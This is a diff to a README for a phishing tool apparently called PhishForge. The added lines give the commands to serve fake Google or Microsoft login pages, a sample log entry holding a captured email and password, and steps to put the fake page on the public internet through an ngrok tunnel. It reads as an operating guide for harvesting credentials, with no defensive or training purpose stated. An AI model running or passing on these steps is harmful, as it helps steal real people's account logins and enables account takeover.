@@ -25,3 +25,25 @@ No installation required. Just clone the repository:
 ```bash
 git clone https://github.com/Rajakumar45/phishforge.git
 cd phishforge
+python3 phishforge.py --template google --port 8080
+
+Captured data is logged to logs/captures.log in real-time.
+
+{
+  "timestamp": "2024-05-20 14:32:01",
+  "ip": "192.168.1.105",
+  "path": "/secure-session",
+  "data": {
+    "email": "user@example.com",
+    "password": "P@ssw0rd123"
+  }
+}
+
+🎛️ Advanced Usage
+
+Using ngrok for Public Access
+# Terminal 1: Start PhishForge
+python3 phishforge.py --template microsoft
+
+# Terminal 2: Start ngrok tunnel
+ngrok http 8080
